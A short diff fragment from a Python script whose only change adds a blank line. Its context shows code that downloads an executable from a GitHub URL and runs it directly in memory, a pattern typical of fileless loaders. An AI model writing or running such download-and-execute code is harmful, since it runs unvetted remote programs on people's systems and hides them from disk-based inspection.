@@ -25,3 +25,4 @@ if __name__ == "__main__":
     exe_data = download_exe_from_github(github_url)
     if exe_data:
         execute_exe_in_memory(exe_data)
+
